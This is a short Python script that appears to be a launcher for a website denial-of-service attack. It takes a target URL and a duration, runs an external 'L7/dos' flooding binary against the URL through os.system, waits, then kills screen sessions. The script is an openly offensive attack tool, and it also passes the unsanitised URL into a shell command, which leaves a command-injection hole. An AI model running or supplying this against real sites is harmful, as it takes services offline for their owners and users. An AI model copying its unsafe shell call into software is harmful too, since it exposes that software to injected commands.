import os
import time
from time import *
from time import sleep
import screen
import sys
import subprocess
import colorama
from colorama import *

class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LM = colorama.Fore.LIGHTMAGENTA_EX
	LW = colorama.Fore.LIGHTWHITE_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET
	
url = sys.argv[1]
x = int(sys.argv[2])

print(Color.LM+"Attack Start")
os.system(f'L7/dos -site {url}')
print(Color.LG+"Target: "+Color.LW+f""+url+"")
print(Color.LG+"Time: "+Color.LW+f" {x} ")
sleep(x)
os.system(f'pkill screen')
print(Color.LM+"End Attack")



